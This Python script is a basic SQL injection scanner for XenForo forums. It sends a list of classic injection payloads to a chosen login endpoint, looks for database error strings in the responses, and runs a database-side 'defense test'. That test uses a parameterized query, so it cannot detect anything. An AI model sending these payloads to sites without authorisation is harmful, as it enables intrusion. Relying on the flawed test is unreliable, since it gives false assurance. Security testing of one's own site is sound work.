import requests
import pymysql
import click
from urllib.parse import urljoin

print("Made By Taylor Christian Newsome / Youtube.com/Stripped")

# Predefined SQL Injection payloads to test
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "admin' --",
    "' UNION SELECT NULL,NULL--",
    "' AND 1=1--",
    "' AND 1=2--"
]

@click.command()
@click.option('--url', prompt='XenForo site URL', help='The URL of the XenForo site to test.')
@click.option('--db-host', prompt='Database Host', help='The database host for the XenForo installation.')
@click.option('--db-user', prompt='Database Username', help='The database username for XenForo.')
@click.option('--db-pass', prompt='Database Password', hide_input=True, help='The database password.')
@click.option('--db-name', prompt='Database Name', help='The XenForo database name.')
@click.option('--test-endpoint', prompt='Endpoint to test (e.g. /login)', help='The relative URL endpoint to test for SQLi.')
def xenforo_sqli_scanner(url, db_host, db_user, db_pass, db_name, test_endpoint):
    """Tool for scanning SQL injection vulnerabilities on XenForo sites."""
    print(f"\nTesting SQL Injection vulnerabilities for XenForo site: {url}{test_endpoint}\n")

    # Check if the URL is reachable
    if not is_site_reachable(url):
        print(f"Error: Unable to reach {url}")
        return

    # Connect to the MySQL database
    try:
        db = connect_to_db(db_host, db_user, db_pass, db_name)
        print("Successfully connected to the XenForo database!")
    except Exception as e:
        print(f"Error: Could not connect to the database. {e}")
        return

    # Perform SQL Injection Tests on URL endpoint
    perform_url_sqli_tests(url, test_endpoint)

    # Perform SQL Injection Defense tests on the database
    perform_sqli_defense_tests(db)

    db.close()
    print("\nTesting completed.")


def is_site_reachable(url):
    """Check if the given URL is reachable."""
    try:
        response = requests.get(url)
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        print(f"Error reaching the site: {e}")
        return False


def connect_to_db(host, user, password, dbname):
    """Connect to the MySQL database."""
    return pymysql.connect(
        host=host,
        user=user,
        password=password,
        db=dbname,
        charset='utf8mb4',
        cursorclass=pymysql.cursors.DictCursor
    )


def perform_url_sqli_tests(base_url, endpoint):
    """Perform SQL injection tests by sending payloads to the specified URL endpoint."""
    full_url = urljoin(base_url, endpoint)
    print(f"Testing SQL Injection on {full_url}")

    for payload in SQLI_PAYLOADS:
        test_url = f"{full_url}?username={payload}&password=test"
        print(f"Testing payload: {payload}")

        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                if check_vulnerable_response(response.text):
                    print(f"Vulnerable to SQL Injection with payload: {payload}")
                else:
                    print(f"No vulnerability detected with payload: {payload}")
            else:
                print(f"Non-200 response received: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")


def check_vulnerable_response(response_text):
    """Check if the response indicates a SQL injection vulnerability."""
    error_indicators = [
        "you have an error in your SQL syntax",
        "Warning: mysql_fetch_array()",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "SQLSTATE"
    ]
    
    return any(indicator.lower() in response_text.lower() for indicator in error_indicators)


def perform_sqli_defense_tests(db):
    """Perform basic SQL injection defense tests on the database."""
    with db.cursor() as cursor:
        cursor.execute("SHOW TABLES LIKE %s", ('xf_user',))
        result = cursor.fetchone()
        if result:
            print("Test 1: 'xf_user' table found. Database looks good.")
        else:
            print("Test 1: 'xf_user' table not found. Check the database structure.")

        sqli_test_query = "SELECT user_id FROM xf_user WHERE username = %s"
        try:
            cursor.execute(sqli_test_query, ('admin\' OR 1=1 -- ',))
            sqli_test_result = cursor.fetchone()
            if sqli_test_result:
                print("Test 2: Potential SQL Injection detected! Ensure prepared statements are being used.")
            else:
                print("Test 2: SQL Injection check passed!")
        except Exception as e:
            print(f"SQL Injection test query failed: {e}")


# Run the script
if __name__ == '__main__':
    xenforo_sqli_scanner()
